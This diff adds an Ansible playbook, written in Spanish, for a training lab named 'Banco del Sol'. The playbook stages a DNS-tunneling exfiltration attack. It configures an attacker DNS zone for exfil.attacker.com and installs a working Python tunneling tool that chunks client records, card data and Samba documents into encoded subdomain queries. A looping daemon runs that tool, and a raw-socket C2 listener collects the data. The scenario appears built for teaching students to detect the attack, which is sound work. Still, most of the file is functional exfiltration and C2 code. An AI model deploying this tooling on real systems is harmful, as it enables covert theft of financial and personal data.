@@ -1,0 +1,689 @@
+---
+# Banco del Sol - Escenario 05: Exfiltracion via DNS Tunneling
+# Simulacion del ataque DNS tunneling
+# Ejecutar DESPUES de base_config.yml
+
+- name: Simulacion de exfiltracion via DNS tunneling
+  hosts: all
+  become: true
+  vars:
+    attacker_ip: "10.10.0.10"
+    exfil_domain: "exfil.attacker.com"
+    dns_server_internal: "10.10.2.10"
+
+  tasks:
+    # =========================================================
+    # CONFIGURAR SERVIDOR DNS DEL ATACANTE
+    # =========================================================
+    - name: Configurar servidor DNS del atacante
+      blockinfile:
+        path: /etc/bind/named.conf.local
+        marker: "# {mark} EXFIL SERVER"
+        insertafter: EOF
+        block: |
+          zone "exfil.attacker.com" {
+              type master;
+              file "/etc/bind/zones/exfil.attacker.com.zone";
+              allow-query { any; };
+          };
+      when: inventory_hostname == "attacker"
+
+    - name: Crear zona DNS para el dominio de exfiltracion
+      copy:
+        content: |
+          $TTL    600
+          @       IN      SOA     ns1.exfil.attacker.com. admin.exfil.attacker.com. (
+                                  2025011501      ; Serial
+                                  3600            ; Refresh
+                                  900             ; Retry
+                                  604800          ; Expire
+                                  600 )           ; Minimum TTL
+          
+                  IN      NS      ns1.exfil.attacker.com.
+                  IN      A       10.10.0.10
+          
+          ns1     IN      A       10.10.0.10
+          
+          ; C2 Server - responde con datos via TXT records
+          c2      IN      A       10.10.0.10
+          c2      IN      TXT     "COMMAND:STATUS_OK"
+          
+          ; Default response for unknown subdomains
+          *       IN      A       10.10.0.10
+          *       IN      TXT     "RECEIVED"
+        dest: /etc/bind/zones/exfil.attacker.com.zone
+        owner: bind
+        group: bind
+        mode: '0644'
+      when: inventory_hostname == "attacker"
+
+    - name: Crear zona reversa para exfiltracion
+      copy:
+        content: |
+          $TTL    600
+          @       IN      SOA     ns1.exfil.attacker.com. admin.exfil.attacker.com. (
+                                  2025011501      ; Serial
+                                  3600            ; Refresh
+                                  900             ; Retry
+                                  604800          ; Expire
+                                  600 )           ; Minimum TTL
+          
+                  IN      NS      ns1.exfil.attacker.com.
+          
+          10      IN      PTR     exfil.attacker.com.
+        dest: /etc/bind/zones/10.10.0.rev
+        owner: bind
+        group: bind
+        mode: '0644'
+      when: inventory_hostname == "attacker"
+
+    - name: Crear directorio de zonas DNS
+      file:
+        path: /etc/bind/zones
+        state: directory
+        owner: bind
+        group: bind
+      when: inventory_hostname == "attacker"
+
+    - name: Habilitar logging DNS en servidor del atacante
+      blockinfile:
+        path: /etc/bind/named.conf.options
+        marker: "# {mark} EXFIL LOGGING"
+        insertbefore: "};"
+        block: |
+              logging {
+                  channel query_log {
+                      file "/var/log/bind/exfil_queries.log" versions 5 size 100m;
+                      severity info;
+                      print-time yes;
+                      print-severity yes;
+                      print-category yes;
+                  };
+                  channel response_log {
+                      file "/var/log/bind/exfil_responses.log" versions 5 size 100m;
+                      severity info;
+                      print-time yes;
+                      print-severity yes;
+                      print-category yes;
+                  };
+                  category queries { query_log; };
+                  category responses { response_log; };
+              };
+      when: inventory_hostname == "attacker"
+
+    - name: Crear directorio de logs del atacante
+      file:
+        path: /var/log/bind
+        state: directory
+        owner: bind
+        group: bind
+      when: inventory_hostname == "attacker"
+
+    - name: Reiniciar DNS en servidor del atacante
+      systemd:
+        name: named
+        state: restarted
+        enabled: yes
+      when: inventory_hostname == "attacker"
+
+    - name: Crear directorio de logs de exfiltracion en atacante
+      file:
+        path: /root/exfil_logs
+        state: directory
+        owner: root
+        group: root
+        mode: '0700'
+      when: inventory_hostname == "attacker"
+
+    # =========================================================
+    # CREAR HERRAMIENTA DE EXFILTRACION EN WORKSTATION
+    # =========================================================
+    - name: Crear script de DNS tunneling en workstation
+      copy:
+        content: |
+          #!/usr/bin/env python3
+          """
+          DNS Tunneling Tool - Simulacion para escenario de entrenamiento
+          Banco del Sol - Escenario 05: Exfiltracion via DNS Tunneling
+          
+          Este script simula la exfiltracion de datos a traves de consultas DNS.
+          Los datos se codifican en base64 y se envian como subdominios.
+          
+          PROPOSITO: Simulacion educativa para curso de ciberseguridad
+          """
+          import base64
+          import dns.resolver
+          import time
+          import json
+          import hashlib
+          import random
+          import os
+          import sys
+          from datetime import datetime
+          
+          class DNSTunnelExfil:
+              def __init__(self, domain, dns_server, chunk_size=60):
+                  self.domain = domain
+                  self.chunk_size = chunk_size
+                  self.dns_server = dns_server
+                  self.query_count = 0
+                  self.data_sent = 0
+                  self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+                  
+                  # Configurar el servidor DNS a utilizar
+                  self.resolver = dns.resolver.Resolver()
+                  self.resolver.nameservers = [dns_server]
+                  self.resolver.timeout = 5
+                  self.resolver.lifetime = 10
+              
+              def encode_data(self, data):
+                  """Codifica datos en base64url (sin padding)"""
+                  if isinstance(data, str):
+                      data = data.encode('utf-8')
+                  encoded = base64.urlsafe_b64encode(data).decode('ascii')
+                  return encoded.rstrip('=')
+              
+              def decode_response(self, response):
+                  """Decodifica respuesta del servidor C2"""
+                  try:
+                      # Simular decodificacion de respuesta C2
+                      return response
+                  except Exception:
+                      return None
+              
+              def send_chunk(self, chunk_id, data, data_type="unknown"):
+                  """Envia un chunk de datos via DNS query"""
+                  encoded = self.encode_data(data)
+                  
+                  # Construir subdominio con formato: [id][data][hash]
+                  chunk_hash = hashlib.md5(encoded.encode()).hexdigest()[:6]
+                  subdomain = f"{chunk_id:04d}-{encoded}-{chunk_hash}"
+                  
+                  # Agregar el dominio completo
+                  query = f"{subdomain}.{self.domain}"
+                  
+                  try:
+                      # Enviar consulta DNS TXT
+                      answers = self.resolver.resolve(query, 'TXT')
+                      response = ""
+                      for rdata in answers:
+                          response += str(rdata)
+                      
+                      self.query_count += 1
+                      self.data_sent += len(data)
+                      
+                      # Registrar consulta en log
+                      log_entry = {
+                          "timestamp": datetime.now().isoformat(),
+                          "session_id": self.session_id,
+                          "chunk_id": chunk_id,
+                          "data_type": data_type,
+                          "original_size": len(data),
+                          "encoded_size": len(encoded),
+                          "query_length": len(query),
+                          "response": response
+                      }
+                      
+                      with open('/var/log/exfil_queries.log', 'a') as f:
+                          f.write(json.dumps(log_entry) + '\n')
+                      
+                      return True
+                      
+                  except Exception as e:
+                      # Registrar error
+                      error_log = {
+                          "timestamp": datetime.now().isoformat(),
+                          "error": str(e),
+                          "query": query
+                      }
+                      with open('/var/log/exfil_errors.log', 'a') as f:
+                          f.write(json.dumps(error_log) + '\n')
+                      return False
+              
+              def exfiltrate_file(self, filepath, data_type="file"):
+                  """Exfilta un archivo completo"""
+                  print(f"[*] Exfiltrando archivo: {filepath}")
+                  
+                  try:
+                      with open(filepath, 'r') as f:
+                          content = f.read()
+                  except FileNotFoundError:
+                      print(f"[!] Archivo no encontrado: {filepath}")
+                      return False
+                  
+                  # Dividir en chunks
+                  chunks = [content[i:i+self.chunk_size] for i in range(0, len(content), self.chunk_size)]
+                  
+                  print(f"[*] Archivo dividido en {len(chunks)} chunks")
+                  
+                  for i, chunk in enumerate(chunks):
+                      success = self.send_chunk(i, chunk, data_type)
+                      if success:
+                          print(f"[+] Chunk {i+1}/{len(chunks)} enviado ({len(chunk)} bytes)")
+                      else:
+                          print(f"[-] Error enviando chunk {i+1}")
+                      
+                      # Pausa entre consultas (simular trafico humano)
+                      time.sleep(random.uniform(2, 5))
+                  
+                  print(f"[+] Archivo exfiltrado: {len(chunks)} chunks, {len(content)} bytes")
+                  return True
+              
+              def exfiltrate_db_record(self, record, data_type="db_record"):
+                  """Exfilta un registro de base de datos"""
+                  record_str = json.dumps(record)
+                  chunks = [record_str[i:i+self.chunk_size] for i in range(0, len(record_str), self.chunk_size)]
+                  
+                  for i, chunk in enumerate(chunks):
+                      self.send_chunk(self.query_count, chunk, data_type)
+                      time.sleep(random.uniform(2, 5))
+                  
+                  return True
+              
+              def run(self):
+                  """Ejecuta la exfiltracion"""
+                  print(f"[*] Iniciando exfiltracion via DNS tunneling")
+                  print(f"[*] Dominio: {self.domain}")
+                  print(f"[*] Servidor DNS: {self.dns_server}")
+                  print(f"[*] Session ID: {self.session_id}")
+                  print()
+                  
+                  # Fase 1: Exfiltrar datos de la base de datos
+                  print("=" * 60)
+                  print("FASE 1: Exfiltracion de base de datos")
+                  print("=" * 60)
+                  
+                  # Simular datos de clientes extraidos
+                  db_records = [
+                      {"dni": "4.123.456-7", "nombre": "Garcia Rodriguez, Maria Elena", "cuenta": "0011-2233-4455", "saldo": 125000.50},
+                      {"dni": "3.987.654-3", "nombre": "Fernandez Lopez, Carlos Alberto", "cuenta": "0011-2233-4456", "saldo": 89750.25},
+                      {"dni": "2.456.789-0", "nombre": "Martinez Silva, Ana Victoria", "cuenta": "0011-2233-4457", "saldo": 342100.00},
+                      {"dni": "5.678.901-2", "nombre": "Rodriguez Perez, Juan Martin", "cuenta": "0011-2233-4458", "saldo": 15680.75},
+                      {"dni": "1.234.567-8", "nombre": "Lopez Gutierrez, Laura Sofia", "cuenta": "0011-2233-4459", "saldo": 275430.90},
+                      {"dni": "4.567.890-1", "nombre": "Hernandez Castro, Roberto Carlos", "cuenta": "0011-2233-4460", "saldo": 67890.30},
+                      {"dni": "3.210.987-6", "nombre": "Torres Ramirez, Patricia Elena", "cuenta": "0011-2233-4461", "saldo": 198540.60},
+                      {"dni": "2.876.543-2", "nombre": "Diaz Morales, Fernando Andres", "cuenta": "0011-2233-4462", "saldo": 43210.45},
+                      {"dni": "5.432.109-8", "nombre": "Sanchez Vargas, Claudia Andrea", "cuenta": "0011-2233-4463", "saldo": 156780.20},
+                      {"dni": "1.098.765-4", "nombre": "Ramirez Otero, Diego Martin", "cuenta": "0011-2233-4464", "saldo": 89320.15}
+                  ]
+                  
+                  # Agregar tarjetas de credito
+                  credit_cards = [
+                      {"tarjeta": "4532-1234-5678-9012", "titular": "Garcia Rodriguez, Maria Elena", "vence": "2027-03-31", "cvv": "847", "limite": 500000},
+                      {"tarjeta": "4532-2345-6789-0123", "titular": "Fernandez Lopez, Carlos Alberto", "vence": "2026-11-30", "cvv": "392", "limite": 300000},
+                      {"tarjeta": "4532-3456-7890-1234", "titular": "Martinez Silva, Ana Victoria", "vence": "2028-06-30", "cvv": "156", "limite": 750000},
+                      {"tarjeta": "4532-4567-8901-2345", "titular": "Rodriguez Perez, Juan Martin", "vence": "2027-09-30", "cvv": "728", "limite": 150000},
+                      {"tarjeta": "4532-5678-9012-3456", "titular": "Lopez Gutierrez, Laura Sofia", "vence": "2026-08-31", "cvv": "614", "limite": 800000}
+                  ]
+                  
+                  # Agregar transacciones
+                  transactions = [
+                      {"id": 1, "fecha": "2025-01-15 09:30:00", "monto": 15000.00, "tipo": "transferencia", "origen": "0011-2233-4455"},
+                      {"id": 2, "fecha": "2025-01-15 14:45:00", "monto": 2500.00, "tipo": "retiro", "origen": "0011-2233-4457"},
+                      {"id": 3, "fecha": "2025-01-16 10:00:00", "monto": 50000.00, "tipo": "deposito", "origen": "0011-2233-4458"},
+                      {"id": 4, "fecha": "2025-01-16 16:20:00", "monto": 8900.50, "tipo": "pago", "origen": "0011-2233-4459"},
+                      {"id": 5, "fecha": "2025-01-17 08:15:00", "monto": 125000.00, "tipo": "transferencia", "origen": "0011-2233-4461"}
+                  ]
+                  
+                  for record in db_records:
+                      self.exfiltrate_db_record(record, "client_data")
+                      time.sleep(random.uniform(10, 30))
+                  
+                  for card in credit_cards:
+                      self.exfiltrate_db_record(card, "credit_card")
+                      time.sleep(random.uniform(10, 30))
+                  
+                  for tx in transactions:
+                      self.exfiltrate_db_record(tx, "transaction")
+                      time.sleep(random.uniform(10, 30))
+                  
+                  print()
+                  print("=" * 60)
+                  print("FASE 2: Exfiltracion de documentos")
+                  print("=" * 60)
+                  
+                  # Fase 2: Exfiltrar documentos del fileserver
+                  document_files = [
+                      "/srv/samba/Directorio/estrategia_2025_confidencial.pdf",
+                      "/srv/samba/Directorio/fusion_bancaria_propuesta.docx",
+                      "/srv/samba/Directorio/reestructuracion_personal.xlsx",
+                      "/srv/samba/Legal/demanda_concursal.docx",
+                      "/srv/samba/Legal/audit_financiera_q3.pdf",
+                      "/srv/samba/Tecnologia/arquitectura_red_interna.vsdx",
+                      "/srv/samba/Tecnologia/credenciales_acceso_privilegiado.xlsx"
+                  ]
+                  
+                  for doc in document_files:
+                      self.exfiltrate_file(doc, "confidential_doc")
+                      time.sleep(random.uniform(30, 60))
+                  
+                  print()
+                  print("=" * 60)
+                  print("RESUMEN DE EXFILTRACION")
+                  print("=" * 60)
+                  print(f"Total de consultas DNS: {self.query_count}")
+                  print(f"Total de datos enviados: {self.data_sent} bytes")
+                  print(f"Sesion: {self.session_id}")
+                  print()
+                  
+                  # Registrar resumen
+                  summary = {
+                      "timestamp": datetime.now().isoformat(),
+                      "session_id": self.session_id,
+                      "total_queries": self.query_count,
+                      "total_bytes_sent": self.data_sent,
+                      "domain": self.domain,
+                      "dns_server": self.dns_server,
+                      "chunks_sent": self.query_count
+                  }
+                  
+                  with open('/var/log/exfil_summary.log', 'a') as f:
+                      f.write(json.dumps(summary) + '\n')
+                  
+                  print("[*] Exfiltracion completada")
+                  
+                  return True
+          
+          if __name__ == "__main__":
+              tunnel = DNSTunnelExfil(
+                  domain="exfil.attacker.com",
+                  dns_server="10.10.0.10",
+                  chunk_size=60
+              )
+              tunnel.run()
+        dest: /home/student/dns_tunnel.py
+        owner: student
+        group: student
+        mode: '0755'
+      when: inventory_hostname == "workstation"
+
+    - name: Crear script de exfiltracion batch para workstation
+      copy:
+        content: |
+          #!/bin/bash
+          # Script de exfiltracion via DNS tunneling
+          # Ejecuta el script Python de forma periodica
+          
+          LOG_FILE="/var/log/exfil_cron.log"
+          SCRIPT_PATH="/home/student/dns_tunnel.py"
+          INTERVAL=300  # 5 minutos
+          
+          echo "[$(date)] Exfiltration cron job iniciado" >> $LOG_FILE
+          
+          while true; do
+              echo "[$(date)] Ejecutando exfiltracion..." >> $LOG_FILE
+              python3 $SCRIPT_PATH >> $LOG_FILE 2>&1
+              echo "[$(date)] Ciclo de exfiltracion completado" >> $LOG_FILE
+              sleep $INTERVAL
+          done
+        dest: /home/student/exfil_daemon.sh
+        owner: student
+        group: student
+        mode: '0755'
+      when: inventory_hostname == "workstation"
+
+    - name: Crear archivo staging con datos para exfiltrar
+      copy:
+        content: |
+          [DATOS SENSIBLES - BANCO DEL SOL]
+          Este archivo contiene datos extraidos para exfiltracion
+          
+          === CLIENTES ===
+          DNI: 4.123.456-7 | Nombre: Garcia Rodriguez, Maria Elena | Cuenta: 0011-2233-4455 | Saldo: $125,000.50
+          DNI: 3.987.654-3 | Nombre: Fernandez Lopez, Carlos Alberto | Cuenta: 0011-2233-4456 | Saldo: $89,750.25
+          DNI: 2.456.789-0 | Nombre: Martinez Silva, Ana Victoria | Cuenta: 0011-2233-4457 | Saldo: $342,100.00
+          DNI: 5.678.901-2 | Nombre: Rodriguez Perez, Juan Martin | Cuenta: 0011-2233-4458 | Saldo: $15,680.75
+          DNI: 1.234.567-8 | Nombre: Lopez Gutierrez, Laura Sofia | Cuenta: 0011-2233-4459 | Saldo: $275,430.90
+          
+          === TARJETAS DE CREDITO ===
+          Tarjeta: 4532-1234-5678-9012 | Titular: Garcia Rodriguez, Maria Elena | Vence: 2027-03-31 | CVV: 847
+          Tarjeta: 4532-2345-6789-0123 | Titular: Fernandez Lopez, Carlos Alberto | Vence: 2026-11-30 | CVV: 392
+          Tarjeta: 4532-3456-7890-1234 | Titular: Martinez Silva, Ana Victoria | Vence: 2028-06-30 | CVV: 156
+          
+          === TRANSACCIONES ===
+          ID: 1 | Fecha: 2025-01-15 | Monto: $15,000.00 | Tipo: transferencia
+          ID: 2 | Fecha: 2025-01-15 | Monto: $2,500.00 | Tipo: retiro
+          ID: 3 | Fecha: 2025-01-16 | Monto: $50,000.00 | Tipo: deposito
+        dest: /home/student/staged_data.txt
+        owner: student
+        group: student
+        mode: '0644'
+      when: inventory_hostname == "workstation"
+
+    - name: Configurar DNS en workstation para usar servidor del atacante
+      blockinfile:
+        path: /etc/resolv.conf
+        marker: "# {mark} EXFIL DNS"
+        insertafter: EOF
+        block: |
+          # Forzar uso de DNS interno para exfiltracion
+          nameserver 10.10.2.10
+      when: inventory_hostname == "workstation"
+
+    # =========================================================
+    # CONFIGURAR CAPTURAS DE TRAFICO
+    # =========================================================
+    - name: Iniciar captura de trafico DNS en domaincontroller
+      command: >
+        tcpdump -i any port 53 -w /var/log/traffic_captures/dns_dc_{{ ansible_date_time.epoch }}.pcap
+      async: 600
+      poll: 0
+      ignore_errors: yes
+      when: inventory_hostname == "domaincontroller"
+
+    - name: Iniciar captura de trafico en workstation
+      command: >
+        tcpdump -i any port 53 -w /var/log/traffic_captures/dns_ws_{{ ansible_date_time.epoch }}.pcap
+      async: 600
+      poll: 0
+      ignore_errors: yes
+      when: inventory_hostname == "workstation"
+
+    # =========================================================
+    # SIMULAR RESPUESTAS C2 DESDE EL SERVIDOR DEL ATACANTE
+    # =========================================================
+    - name: Crear script de respuesta C2
+      copy:
+        content: |
+          #!/usr/bin/env python3
+          """
+          Simula el servidor C2 que responde a consultas DNS de exfiltracion
+          """
+          import socket
+          import struct
+          import threading
+          import time
+          from datetime import datetime
+          
+          class C2Server:
+              def __init__(self, listen_ip="0.0.0.0", port=53):
+                  self.listen_ip = listen_ip
+                  self.port = port
+                  self.received_data = []
+                  self.query_log = "/root/exfil_logs/received_data.log"
+              
+              def parse_dns_query(self, data):
+                  """Parse simple de consulta DNS"""
+                  try:
+                      # Saltar header DNS (12 bytes)
+                      questions = data[12:]
+                      
+                      # Leer nombre de dominio
+                      domain_parts = []
+                      i = 0
+                      while i < len(questions) and questions[i] != 0:
+                          length = questions[i]
+                          domain_parts.append(questions[i+1:i+1+length].decode('ascii', errors='ignore'))
+                          i += 1 + length
+                      
+                      full_domain = '.'.join(domain_parts)
+                      return full_domain
+                  except Exception as e:
+                      return None
+              
+              def create_dns_response(self, query_data, response_text="RECEIVED"):
+                  """Crea una respuesta DNS con TXT record"""
+                  # Construir respuesta DNS basica
+                  txid = query_data[:2]
+                  flags = b'\x81\x80'  # Standard response, no error
+                  qdcount = query_data[4:6]
+                  ancount = b'\x00\x01'  # 1 answer
+                  nscount = b'\x00\x00'
+                  arcount = b'\x00\x00'
+                  
+                  header = txid + flags + qdcount + ancount + nscount + arcount
+                  question = query_data[12:]
+                  
+                  # TXT record response
+                  txt_data = response_text.encode('ascii')
+                  txt_length = len(txt_data)
+                  
+                  answer = (
+                      b'\xc0\x0c'  # Name pointer
+                      b'\x00\x10'  # Type TXT
+                      b'\x00\x01'  # Class IN
+                      b'\x00\x00\x0e\x10'  # TTL 3600
+                      struct.pack('>H', txt_length + 1)  # RDLENGTH
+                      bytes([txt_length])  # TXT length
+                      + txt_data
+                  )
+                  
+                  return header + question + answer
+              
+              def handle_query(self, data, addr):
+                  """Procesa una consulta DNS recibida"""
+                  domain = self.parse_dns_query(data)
+                  
+                  if domain and "exfil.attacker.com" in domain:
+                      # Extraer datos del subdominio
+                      subdomain = domain.replace(".exfil.attacker.com", "")
+                      
+                      timestamp = datetime.now().isoformat()
+                      log_entry = f"{timestamp} | {addr[0]} | {domain} | subdomain_length={len(subdomain)}"
+                      
+                      # Registrar en log
+                      with open(self.query_log, 'a') as f:
+                          f.write(log_entry + '\n')
+                      
+                      # Almacenar datos recibidos
+                      self.received_data.append({
+                          "timestamp": timestamp,
+                          "source_ip": addr[0],
+                          "domain": domain,
+                          "subdomain": subdomain
+                      })
+                      
+                      print(f"[{timestamp}] Received from {addr[0]}: {domain[:50]}...")
+                  
+                  # Enviar respuesta
+                  response = self.create_dns_response(data)
+                  return response
+              
+              def run(self):
+                  """Ejecuta el servidor C2"""
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                  sock.bind((self.listen_ip, self.port))
+                  
+                  print(f"[*] C2 Server listening on {self.listen_ip}:{self.port}")
+                  print(f"[*] Logging to {self.query_log}")
+                  
+                  while True:
+                      try:
+                          data, addr = sock.recvfrom(512)
+                          response = self.handle_query(data, addr)
+                          sock.sendto(response, addr)
+                      except Exception as e:
+                          print(f"[!] Error: {e}")
+          
+          if __name__ == "__main__":
+              server = C2Server()
+              server.run()
+        dest: /root/c2_server.py
+        owner: root
+        group: root
+        mode: '0755'
+      when: inventory_hostname == "attacker"
+
+    # =========================================================
+    # INICIAR EL ATAQUE (DELAYED TO ALLOW SETUP)
+    # =========================================================
+    - name: Iniciar daemon de exfiltracion en workstation
+      command: nohup bash /home/student/exfil_daemon.sh &
+      async: 600
+      poll: 0
+      ignore_errors: yes
+      when: inventory_hostname == "workstation"
+
+    - name: Iniciar servidor C2 en atacante
+      command: nohup python3 /root/c2_server.py > /root/c2_output.log 2>&1 &
+      async: 600
+      poll: 0
+      ignore_errors: yes
+      when: inventory_hostname == "attacker"
+
+    # =========================================================
+    # REGISTRAR ESTADO DEL ESCENARIO
+    # =========================================================
+    - name: Crear archivo de estado del escenario
+      copy:
+        content: |
+          ESCENARIO 05: EXFILTRACION VIA DNS TUNNELING
+          =============================================
+          Estado: ACTIVO
+          Inicio: {{ ansible_date_time.iso8601 }}
+          
+          RESUMEN:
+          - Servidor DNS del atacante configurado y operativo en 10.10.0.10
+          - Script de DNS tunneling instalado en workstation (10.10.2.100)
+          - Daemon de exfiltracion ejecutandose cada 5 minutos
+          - Base de datos de clientes configurada en database (10.10.2.40)
+          - Documentos confidenciales en fileserver (10.10.2.30)
+          - Capturas de trafico DNS activas
+          - Servidor C2 recibiendo datos exfiltrados
+          
+          DATOS OBJETIVO:
+          - Registros de 10 clientes (DNI, nombre, cuenta, saldo)
+          - 5 tarjetas de credito con datos completos
+          - 10 transacciones bancarias
+          - 7 documentos confidenciales
+          
+          METODO:
+          - DNS tunneling con subdominios codificados en base64
+          - Chunk size: 60 bytes por consulta
+          - Intervalo: 2-5 segundos entre consultas
+          - Dominio de exfiltracion: exfil.attacker.com
+          - Canal C2: registros TXT
+          
+          LOGS:
+          - Exfiltracion: /var/log/exfil_queries.log (workstation)
+          - C2: /root/exfil_logs/received_data.log (attacker)
+          - DNS: /var/log/bind/query.log (domaincontroller)
+          - Capturas: /var/log/traffic_captures/ (workstation, domaincontroller)
+          
+          Para los estudiantes:
+          - Inicie analisis desde la workstation comprometida
+          - Revise los logs DNS en el domaincontroller
+          - Analice las capturas de trafico con tshark/wireshark
+          - Identifique las consultas anomalas y decodifique los datos
+        dest: /root/escenario_estado.txt
+        owner: root
+        group: root
+        mode: '0644'
+      when: inventory_hostname in ["attacker", "workstation"]
+
+    - name: Mostrar resumen de configuracion
+      debug:
+        msg: >
+          [{{ inventory_hostname }}] Configuracion completada.
+          {% if inventory_hostname == "attacker" %}
+          Servidor C2 activo en puerto 53. Logs en /root/exfil_logs/
+          {% elif inventory_hostname == "workstation" %}
+          Script de exfiltracion instalado. Daemon ejecutandose cada 5 minutos.
+          {% elif inventory_hostname == "database" %}
+          Base de datos de prueba cargada con datos de clientes y tarjetas.
+          {% elif inventory_hostname == "fileserver" %}
+          Documentos confidenciales creados en shares SMB.
+          {% elif inventory_hostname == "domaincontroller" %}
+          DNS logging habilitado. Captura de trafico activa.
+          {% endif %}
